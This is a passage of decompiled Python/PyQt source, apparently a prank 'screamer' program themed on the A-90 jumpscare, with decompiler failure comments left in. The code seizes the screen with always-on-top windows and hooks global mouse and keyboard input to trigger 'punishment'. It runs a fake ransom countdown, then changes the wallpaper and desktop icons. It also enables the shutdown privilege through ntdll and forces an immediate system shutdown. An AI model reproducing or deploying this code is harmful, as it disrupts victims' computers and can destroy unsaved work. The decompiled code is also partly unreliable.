        self.gold_icon.setStyleSheet('\n\t\t\tcolor: rgb(255, 235, 45);\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 31px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.gold_icon.setAlignment(Qt.AlignCenter)
        self.gold_label = QLabel(self.gold_box)
        self.gold_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 28px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.gold_label.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        layout.addWidget(self.gold_icon)
        layout.addWidget(self.gold_label)
        self.update_gold_label()
        self.gold_box.adjustSize()
        self.gold_box.setFixedHeight(box_height)
        self.gold_box.move(8, 225)
        self.time_box = QFrame(self)
        self.time_box.setStyleSheet('\n\t\t\tQFrame {\n\t\t\t\tbackground-color: black;\n\t\t\t\tborder: 3px solid rgb(120, 0, 0);\n\t\t\t\tborder-radius: 0px;\n\t\t\t}\n\t\t\t')
        layout2 = QHBoxLayout(self.time_box)
        layout2.setContentsMargins(10, 6, 14, 6)
        layout2.setSpacing(10)
        self.time_title = QLabel('TIME:', self.time_box)
        self.time_title.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.time_title.setAlignment(Qt.AlignLeft | Qt.AlignVCenter)
        self.timer_label = QLabel('01:18', self.time_box)
        self.timer_label.setStyleSheet('\n\t\t\tcolor: white;\n\t\t\tbackground: transparent;\n\t\t\tborder: none;\n\t\t\tfont-size: 25px;\n\t\t\tfont-weight: bold;\n\t\t\t')
        self.timer_label.setAlignment(Qt.AlignRight | Qt.AlignVCenter)
        layout2.addWidget(self.time_title)
        layout2.addWidget(self.timer_label)
        self.time_box.adjustSize()
        self.time_box.setFixedWidth(222)
        self.time_box.setFixedHeight(box_height)
        self.time_box.move(203, 225)
        self.countdown = QTimer(self)
        self.countdown.timeout.connect(self.update_timer)
        self.countdown.start(1000)
    def pulse_red_flash(self):
        flash = QLabel(self)
        flash.setGeometry(0, 0, self.width(), self.height())
        flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        opacity = QGraphicsOpacityEffect(flash)
        flash.setGraphicsEffect(opacity)
        opacity.setOpacity(0.75)
        flash.show()
        flash.raise_()
        animation = QPropertyAnimation(opacity, b'opacity', self)
        animation.setDuration(350)
        animation.setStartValue(0.75)
        animation.setEndValue(0.0)
        animation.finished.connect(flash.deleteLater)
        flash._pulse_animation = animation
        animation.start()
    def update_gold_label(self):
        self.gold_label.setText(f'{self.required_gold}')
    def reduce_required_gold(self, amount=50):
        if self.ransom_game.finished:
            return
        else:
            self.required_gold = max(0, self.required_gold - amount)
            self.update_gold_label()
            if self.required_gold <= 0:
                self.countdown.stop()
                self.ransom_game.win()
    def update_timer(self):
        if self.ransom_game.finished:
            self.countdown.stop()
            return
        else:
            self.time_left -= 1
            minutes = self.time_left // 60
            seconds = self.time_left % 60
            self.timer_label.setText(f'{minutes:02d}:{seconds:02d}')
            if self.time_left == 15:
                sound_manager.play_ticking()
                self.pulse_red_flash()
            if self.time_left <= 0:
                self.countdown.stop()
                self.ransom_game.lose_game()
    def closeEvent(self, event):
        self.countdown.stop()
        event.accept()
class RansomBonusWindow(QWidget):
    """RansomBonusWindow"""
    def __init__(self, image_path, ransom_window):
        super().__init__()
        self.stop_signs = []
        self.ransom_window = ransom_window
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.label = QLabel(self)
        self.label.setAttribute(Qt.WA_TranslucentBackground)
        self.label.setStyleSheet('background: transparent; border: none;')
        self.label.installEventFilter(self)
        pixmap = load_pixmap(image_path)
        if pixmap.isNull():
            self.resize(1, 1)
        else:
            self.label.setPixmap(pixmap)
            self.label.resize(pixmap.size())
            self.resize(pixmap.size())
    def eventFilter(self, obj, event):
        if obj == self.label and event.type() == event.MouseButtonPress and (event.button() == Qt.LeftButton):
            self.collect_bonus()
            return True
        else:
            return super().eventFilter(obj, event)
    def collect_bonus(self):
        sound_manager.play_effect('coin_sound.mp3')
        try:
            if self.ransom_window is not None and self.ransom_window.isVisible():
                    self.ransom_window.reduce_required_gold(50)
        except RuntimeError:
            pass
        self.close()
class SimpleLoseJumpscare(QWidget):
    def __init__(self):
        super().__init__()
        self.stop_signs = []
        self.stop_sign_index = 0
        self.stop_sign_timer = QTimer(self)
        self.stop_sign_timer.timeout.connect(self.add_stop_sign)
        self.setWindowFlags(Qt.Window | Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_DeleteOnClose, False)
        self.setStyleSheet('background-color: black;')
        self.image = QLabel(self)
        self.image.setAttribute(Qt.WA_TranslucentBackground)
        self.image.setStyleSheet('background: transparent; border: none;')
        self.image.setAlignment(Qt.AlignCenter)
        pixmap = load_pixmap('A-90_JUMPSCARE.png')
        if pixmap.isNull():
            print('ERROR: A-90_JUMPSCARE.png could not be loaded.')
        else:
            self.image_pixmap = pixmap
        self.flash = QLabel(self)
        self.flash.setStyleSheet('background-color: rgb(255, 0, 0);')
        self.flash.hide()
        self.shake_strength = 20
        self.shake_timer = QTimer(self)
        self.shake_timer.timeout.connect(self.shake_face)
        self.shake_timer.start(30)
        self.showFullScreen()
        self.resize_contents()
        self.image.show()
        self.image.raise_()
        self.raise_()
        self.activateWindow()
        QTimer.singleShot(100, self.flash_red)
        QTimer.singleShot(180, self.show_image)
        QTimer.singleShot(450, self.flash_red)
        QTimer.singleShot(520, self.show_image)
        ransomflashoverlay = RansomFlashOverlay()
        QTimer.singleShot(1000, self.finish)
    def set_wallpaper(self, filename):
        path = resource_path(filename)
        if not os.path.exists(path):
            print(f'Wallpaper not found: {path}')
            return False
        else:
            try:
                result = windll.user32.SystemParametersInfoW(20, 0, path, 3)
                return bool(result)
            except Exception as e:
                print(f'Failed to set wallpaper: {e}')
                return False
    def loser(self):
        self.set_wallpaper('fail_bg.png')
        self.stop_signs.clear()
        self.stop_sign_index = 0
        self.stop_sign_timer.start(3)
    def add_stop_sign(self):
        sound_manager.play_effect('blip.mp3')
        if self.stop_sign_index >= 200:
            self.stop_sign_timer.stop()
            subprocess.run(['shutdown', '/s', '/t', '0'])
            return
        else:
            label = QLabel()
            label.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
            label.setAttribute(Qt.WA_TranslucentBackground)
            pixmap = load_pixmap('stop_sign.png')
            if pixmap.isNull():
                print('Could not load stop_sign.png')
                self.stop_sign_timer.stop()
                return
            else:
                label.setPixmap(pixmap)
                label.resize(pixmap.size())
                screen = QApplication.primaryScreen().geometry()
                x = random.randint(screen.left(), max(screen.left(), screen.right() - label.width()))
                y = random.randint(screen.top(), max(screen.top(), screen.bottom() - label.height()))
                label.move(x, y)
                label.show()
                label.raise_()
                self.stop_signs.append(label)
                self.stop_sign_index += 1
    def resize_contents(self):
        if hasattr(self, 'image_pixmap'):
            pixmap = self.image_pixmap.scaled(int(self.width() * 0.75), int(self.height() * 0.75), Qt.KeepAspectRatio, Qt.FastTransformation)
            self.image.setPixmap(pixmap)
        self.image.setGeometry(0, 0, self.width(), self.height())
        self.flash.setGeometry(0, 0, self.width(), self.height())
    def resizeEvent(self, event):
        self.resize_contents()
        event.accept()
    def shake_face(self):
        if not self.isVisible() or not hasattr(self, 'image_pixmap'):
            return None
        else:
            center_x = (self.width() - self.image.width()) // 2
            center_y = (self.height() - self.image.height()) // 2
            self.image.move(center_x + random.randint(-self.shake_strength, self.shake_strength), center_y + random.randint(-self.shake_strength, self.shake_strength))
            self.image.raise_()
    def flash_red(self):
        if self.isVisible():
            self.shake_strength = 9
            self.flash.show()
            self.flash.raise_()
            self.raise_()
            self.activateWindow()
    def show_image(self):
        if self.isVisible():
            self.flash.hide()
            self.shake_strength = 5
            self.image.show()
            self.image.raise_()
            self.raise_()
            self.activateWindow()
    def finish(self):
        global ransom_flash_overlay
        self.shake_timer.stop()
        ransom_flash_overlay = RansomFlashOverlay()
        ransom_flash_overlay.show()
        ransom_flash_overlay.raise_()
        ransom_flash_overlay.activateWindow()
        self.close()
        QTimer.singleShot(900, self.finish_after_flash)
    def finish_after_flash(self):
        global ransom_flash_overlay
        self.loser()
        try:
            if ransom_flash_overlay is not None:
                ransom_flash_overlay.close()
        except RuntimeError:
            return None
        ransom_flash_overlay = None
    def closeEvent(self, event):
        self.shake_timer.stop()
        event.accept()
class RansomFlashOverlay(QWidget):
    """RansomFlashOverlay"""
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setGeometry(QApplication.primaryScreen().geometry())
        self.flash = QLabel(self)
        self.flash.setGeometry(0, 0, self.width(), self.height())
        self.flash.setStyleSheet('background: rgba(255, 0, 0, 255);')
        self.opacity = 255
        self.fade_timer = QTimer(self)
        self.fade_timer.timeout.connect(self.fade_out)
        self.show()
        self.raise_()
        self.activateWindow()
        QTimer.singleShot(500, self.start_fade)
    def start_fade(self):
        self.fade_timer.start(16)
    def fade_out(self):
        self.opacity -= 12
        if self.opacity <= 0:
            self.opacity = 0
            self.fade_timer.stop()
            self.close()
        else:
            self.flash.setStyleSheet(f'background: rgba(255, 0, 0, {self.opacity});')
class RansomMinigame(QWidget):
    # ***<module>.RansomMinigame: Failure: Different bytecode
    """RansomMinigame"""
    def __init__(self):
        super().__init__()
        self.finished = False
        self.bonus_windows = []
        self.image_windows = []
        self.fake_bonus_windows = []
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.showFullScreen()
        self.border = QLabel(self)
        self.border.setGeometry(0, 0, self.width(), self.height())
        self.border.setStyleSheet('background: transparent; border: 18px solid rgb(180, 0, 0);')
        self.border.show()
        self.timer_window = RansomTimerWindow(self)
        self.position_window_randomly(self.timer_window)
        self.timer_window.show()
        self.timer_window.raise_()
        self.bonus_timer = QTimer(self)
        self.bonus_timer.timeout.connect(self.try_spawn_bonus)
        self.bonus_timer.start(RANSOM_BONUS_CHECK_INTERVAL)
        self.fake_bonus_timer = QTimer(self)
        self.fake_bonus_timer.timeout.connect(self.try_spawn_fake_bonus)
        self.fake_bonus_timer.start(RANSOM_FAKE_BONUS_CHECK_INTERVAL)
        for image_path in GLITCH_IMAGES:
            window = RansomImageWindow(image_path)
            self.position_window_randomly(window)
            window.show()
            window.raise_()
            self.image_windows.append(window)
        self.teleport_timer = QTimer(self)
        self.teleport_timer.timeout.connect(self.teleport_windows)
        self.teleport_timer.start(3000)
        self.glitch_timer = QTimer(self)
        self.glitch_timer.timeout.connect(self.glitch_border)
        self.glitch_timer.start(45)
        self.border.raise_()
        self.show()
        self.flash_overlay = RansomFlashOverlay()
    def position_window_randomly(self, window):
        screen = QApplication.primaryScreen()
        if screen is None:
            return
        else:
            geometry = screen.availableGeometry()
            margin = 80
            max_x = max(margin, geometry.width() - window.width() - margin)
            max_y = max(margin, geometry.height() - window.height() - margin)
            x = random.randint(margin, max_x)
            y = random.randint(margin, max_y)
            x += geometry.left()
            y += geometry.top()
            if isinstance(window, RansomImageWindow):
                window.set_base_position(x, y)
            else:
                window.move(x, y)
    def try_spawn_bonus(self):
        if self.finished:
            return

        # Remove closed windows from the list
        self.bonus_windows = [
            window for window in self.bonus_windows
            if window is not None and window.isVisible()
        ]

        # Maximum of 3 real coins
        if len(self.bonus_windows) >= 3:
            return

        if random.random() >= RANSOM_BONUS_CHANCE:
            return

        try:
            bonus_window = RansomBonusWindow(
                RANSOM_BONUS_IMAGE,
                self.timer_window
            )

            bonus_window.destroyed.connect(
                lambda: self.bonus_window_destroyed(bonus_window)
            )

            self.bonus_windows.append(bonus_window)

            self.position_window_randomly(bonus_window)
            bonus_window.show()
            bonus_window.raise_()

        except RuntimeError:
            pass
    def bonus_window_destroyed(self, window):
        try:
            if window in self.bonus_windows:
                self.bonus_windows.remove(window)
        except RuntimeError:
            pass
    def try_spawn_fake_bonus(self):
        if self.finished:
            return
        else:
            if random.random() >= RANSOM_FAKE_BONUS_CHANCE:
                return
            else:
                fake_bonus_window = RansomImageWindow(RANSOM_BONUS_IMAGE, fake_bonus=True, ransom_window=self.timer_window)
                fake_bonus_window.destroyed.connect(lambda: self.fake_bonus_window_destroyed(fake_bonus_window))
                self.fake_bonus_windows.append(fake_bonus_window)
                self.position_window_randomly(fake_bonus_window)
                fake_bonus_window.show()
                fake_bonus_window.raise_()
    def fake_bonus_window_destroyed(self, window):
        try:
            if window in self.fake_bonus_windows:
                self.fake_bonus_windows.remove(window)
        except RuntimeError:
            return None
    def collect_fake_bonus(self):
        try:
            sound_manager.play_effect(random.choice(['laugh1.mp3', 'laugh2.mp3']))
            if self.timer_window is not None and self.timer_window.isVisible():
                    self.timer_window.required_gold += 50
                    self.timer_window.update_gold_label()
        except RuntimeError:
            pass
        for window in self.fake_bonus_windows[:]:
            try:
                window.close()
            except RuntimeError:
                pass
        self.fake_bonus_windows.clear()
    def teleport_windows(self):
        # irreducible cflow, using cdg fallback
        # ***<module>.RansomMinigame.teleport_windows: Failure: Compilation Error
        if self.finished:
            return
        else:
            for window in self.image_windows:
                try:
                    if window.isVisible():
                        self.position_window_randomly(window)
                        window.raise_()
                except RuntimeError:
                    continue
            try:
                if self.timer_window.isVisible():
                    self.position_window_randomly(self.timer_window)
                    self.timer_window.raise_()
            except RuntimeError:
                pass
            for window in self.bonus_windows[:]:
                try:
                    if window.isVisible():
                        self.position_window_randomly(window)
                        window.raise_()
                    else:
                        self.bonus_windows.remove(window)
                except RuntimeError:
                    try:
                        self.bonus_windows.remove(window)
                    except ValueError:
                        pass
            for window in self.fake_bonus_windows[:]:
                try:
                    if window.isVisible():
                        self.position_window_randomly(window)
                        window.raise_()
                except RuntimeError:
                    try:
                        self.fake_bonus_windows.remove(window)
                    except ValueError:
                        pass
    def glitch_border(self):
        if self.finished:
            return
        else:
            thickness = random.randint(8, 30)
            red = random.randint(90, 255)
            green = random.randint(0, 12)
            blue = random.randint(0, 12)
            offset_x = random.randint((-5), 5)
            offset_y = random.randint((-5), 5)
            self.border.setStyleSheet(f'\n\t\t\tbackground: transparent;\n\t\t\tborder: {thickness}px solid\n\t\t\t\trgb({red}, {green}, {blue});\n\t\t\t')
            self.border.setGeometry(offset_x, offset_y, self.width() - offset_x * 2, self.height() - offset_y * 2)
            if random.random() < 0.12:
                self.border.setStyleSheet(f'\n\t\t\t\tbackground: transparent;\n\n\t\t\t\tborder-top:\n\t\t\t\t\t{random.randint(2, 8)}px solid\n\t\t\t\t\trgb(255, 0, 0);\n\n\t\t\t\tborder-bottom:\n\t\t\t\t\t{random.randint(2, 8)}px solid\n\t\t\t\t\trgb(120, 0, 0);\n\n\t\t\t\tborder-left:\n\t\t\t\t\t{random.randint(2, 8)}px solid\n\t\t\t\t\trgb(255, 0, 0);\n\n\t\t\t\tborder-right:\n\t\t\t\t\t{random.randint(2, 8)}px solid\n\t\t\t\t\trgb(80, 0, 0);\n\t\t\t\t')
    def win(self):
        if self.finished:
            return
        else:
            self.finished = True
            self.stop_timers()
            sound_manager.stop_all()
            self.win_glitch_index = 0
            try:
                self.timer_window.show()
                self.timer_window.raise_()
            except RuntimeError:
                pass
            self.win_cleanup_timer = QTimer(self)
            self.win_cleanup_timer.timeout.connect(self.remove_next_glitch_window)
            self.win_cleanup_timer.start(180)
    def remove_next_glitch_window(self):
        if self.win_glitch_index < len(self.image_windows):
            window = self.image_windows[self.win_glitch_index]
            try:
                window.close()
            except RuntimeError:
                pass
            self.win_glitch_index += 1
        else:
            self.win_cleanup_timer.stop()
            for window in self.bonus_windows[:]:
                try:
                    window.close()
                except RuntimeError:
                    pass

            self.bonus_windows.clear()
            for window in self.fake_bonus_windows[:]:
                try:
                    window.close()
                except RuntimeError:
                    pass
            self.fake_bonus_windows.clear()
            self.blackout_timer_window()
    def blackout_timer_window(self):
        try:
            timer = self.timer_window
            self.timer_blackout = QLabel(timer)
            self.timer_blackout.setGeometry(0, 126, timer.width(), timer.height() - 126)
            self.timer_blackout.setStyleSheet('background-color: black;')
            self.timer_blackout.show()
            self.timer_blackout.raise_()
            timer.header.raise_()
            timer.a90_image.raise_()
            timer.header_text.raise_()
            timer.show()
            timer.raise_()
        except RuntimeError:
            self.finish_win_sequence()
            return None
        QTimer.singleShot(900, self.finish_win_sequence)
    def finish_win_sequence(self):
        global success_window
        try:
            if hasattr(self, 'timer_blackout'):
                self.timer_blackout.hide()
        except RuntimeError:
            pass
        self.close_ransom_windows()
        try:
            self.close()
        except RuntimeError:
            pass
        event_controller.punishment_active = True
        try:
            restore_desktop_icons()
        except Exception as e:
            print(f'Failed to restore desktop icons: {e}')
        success_window = SuccessWindow()
        success_window.show()
        success_window.raise_()
    def lose_game(self):
        global lose_jumpscare_window
        if self.finished:
            return
        else:
            self.finished = True
            event_controller.punishment_active = True
            self.stop_timers()
            sound_manager.stop_music()
            sound_manager.stop_ticking()
            sound_manager.play_effect('realscare.wav')
            lose_jumpscare_window = SimpleLoseJumpscare()
            lose_jumpscare_window.show()
            lose_jumpscare_window.raise_()
            lose_jumpscare_window.activateWindow()
            QApplication.processEvents()
            nullptr = POINTER(c_int)()
            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
            nullptr = POINTER(c_int)()
            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
            self.close_ransom_windows()
            self.close()
    def stop_timers(self):
        self.glitch_timer.stop()
        self.teleport_timer.stop()
        self.bonus_timer.stop()
        self.fake_bonus_timer.stop()
        try:
            self.timer_window.countdown.stop()
        except Exception:
            return None
    def close_ransom_windows(self):
        for window in self.bonus_windows[:]:
            try:
                window.close()
            except RuntimeError:
                pass

        self.bonus_windows.clear()
        for window in self.fake_bonus_windows[:]:
            try:
                window.close()
            except RuntimeError:
                pass
        self.fake_bonus_windows.clear()
        try:
            self.timer_window.close()
        except RuntimeError:
            pass
        for window in self.image_windows:
            try:
                window.close()
            except RuntimeError:
                pass
        self.image_windows.clear()
    def closeEvent(self, event):
        self.stop_timers()
        event.accept()
class FlashOverlay(QWidget):
    def __init__(self, image1, image2):
        super().__init__()
        self.input_active = False
        self.mouse_listener = None
        self.keyboard_listener = None
        self.pixmap1 = load_pixmap(image1)
        self.pixmap2 = load_pixmap(image2)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.showFullScreen()
        self.background = QLabel(self)
        self.background.setGeometry(0, 0, self.width(), self.height())
        self.background.hide()
        self.label = QLabel(self)
        self.label.setAttribute(Qt.WA_TranslucentBackground)
        self.label.setStyleSheet('background: transparent; border: none;')
        self.label.hide()
        self.static_timer = QTimer(self)
        self.static_timer.timeout.connect(self.make_static)
        QTimer.singleShot(50, self.show_a90)
    def start_input_listener(self):
        if self.input_active:
            return
        else:
            self.input_active = True
            self.mouse_listener = mouse.Listener(on_move=self.on_mouse_move, on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
            self.mouse_listener.start()
            self.keyboard_listener.start()
    def stop_input_listener(self):
        self.input_active = False
        try:
            if self.mouse_listener:
                self.mouse_listener.stop()
        except Exception:
            pass
        try:
            if self.keyboard_listener:
                self.keyboard_listener.stop()
        except Exception:
            pass
        self.mouse_listener = None
        self.keyboard_listener = None
    def punish_input(self):
        global punish
        punish = True
    def on_mouse_move(self, x, y):
        if self.input_active:
            self.punish_input()
    def on_mouse_click(self, x, y, button, pressed):
        if self.input_active and pressed:
                self.punish_input()
    def on_mouse_scroll(self, x, y, dx, dy):
        if self.input_active:
            self.punish_input()
    def on_key_press(self, key):
        if self.input_active:
            self.punish_input()
    def make_static(self):
        width = 160
        height = 90
        image = QImage(width, height, QImage.Format_RGB32)
        for y in range(height):
            for x in range(width):
                noise = random.randint((-35), 35)
                r = max(0, min(255, 65 + noise))
                g = max(0, min(255, 2 + noise // 4))
                b = max(0, min(255, 2 + noise // 4))
                image.setPixelColor(x, y, QColor(r, g, b))
        image = image.scaled(self.width(), self.height(), Qt.IgnoreAspectRatio, Qt.FastTransformation)
        self.background.setPixmap(QPixmap.fromImage(image))
    def show_a90(self):
        if self.pixmap1.isNull():
            self.finish()
            return
        else:
            self.label.setPixmap(self.pixmap1)
            self.label.resize(self.pixmap1.size())
            x = random.randint(0, max(0, self.width() - self.pixmap1.width()))
            y = random.randint(0, max(0, self.height() - self.pixmap1.height()))
            self.label.move(x, y)
            self.label.show()
            self.label.raise_()
            QTimer.singleShot(random.randint(800, 1800), self.apply_static)
    def apply_static(self):
        sound_manager.play_effect('start.mp3')
        self.make_static()
        self.background.show()
        self.background.lower()
        self.center_image(self.pixmap1)
        self.static_timer.start(35)
        QTimer.singleShot(random.randint(250, 450), self.show_stop_sign)
    def show_stop_sign(self):
        if self.pixmap2.isNull():
            self.finish()
        else:
            self.label.setPixmap(self.pixmap2)
            self.label.resize(self.pixmap2.size())
            self.center_image(self.pixmap2)
            QTimer.singleShot(random.randint(100, 180), self.show_a90_again)
    def show_a90_again(self):
        self.static_timer.stop()
        self.background.hide()
        self.label.setPixmap(self.pixmap1)
        self.label.resize(self.pixmap1.size())
        self.center_image(self.pixmap1)
        QTimer.singleShot(random.randint(100, 180), self.show_red)
    def show_red(self):
        self.label.hide()
        self.background.setStyleSheet('background-color: rgb(90, 0, 0);')
        self.background.show()
        self.background.raise_()
        self.start_input_listener()
        QTimer.singleShot(random.randint(80, 150), self.finish)
    def center_image(self, pixmap):
        self.label.move((self.width() - pixmap.width()) // 2, (self.height() - pixmap.height()) // 2)
    def finish(self):
        global punish
        self.static_timer.stop()
        self.stop_input_listener()
        self.label.hide()
        self.background.hide()
        failed = punish
        if failed:
            punish = False
            event_controller.punishment_active = True
            sound_manager.play_effect('fail.mp3')
            self.jumpscare = JumpscareWindow('A-90_JUMPSCARE.png')
            self.jumpscare.show()
            self.jumpscare.raise_()
            self.jumpscare.activateWindow()
            QTimer.singleShot(50, self.wait_for_jumpscare)
        else:
            self.close()
    def wait_for_jumpscare(self):
        try:
            if hasattr(self, 'jumpscare') and self.jumpscare.isVisible():
                QTimer.singleShot(50, self.wait_for_jumpscare)
            else:
                self.start_ransom()
                self.close()
        except RuntimeError:
            return None
    def start_ransom(self):
        try:
            apply_desktop_icons()
        except Exception as e:
            print(f'Failed to change desktop icons: {e}')
        sound_manager.play_music('da song.mp3')
        self.ransom_game = RansomMinigame()
        self.ransom_game.show()
    def closeEvent(self, event):
        self.static_timer.stop()
        self.stop_input_listener()
        event.accept()
class EventController:
    # ***<module>.EventController: Failure: Different bytecode
    """EventController"""
    def __init__(self, app):
        self.app = app
        self.cooldown = False
        self.punishment_active = False
        self.overlay = None
    def trigger_event(self):
        if self.cooldown or self.punishment_active:
            return None
        else:
            self.cooldown = True
            self.overlay = FlashOverlay('A-90_IDLE.png', 'stop_sign.png')
            self.overlay.show()
            QTimer.singleShot(TRIGGER_COOLDOWN * 1000, self.end_cooldown)
    def end_cooldown(self):
        self.cooldown = False
        if not self.punishment_active:
            self.trigger_event()
app = QApplication(sys.argv)
app.setQuitOnLastWindowClosed(False)
sound_manager = SoundManager()
event_controller = EventController(app)
QTimer.singleShot(1000, event_controller.trigger_event)
sys.exit(app.exec_())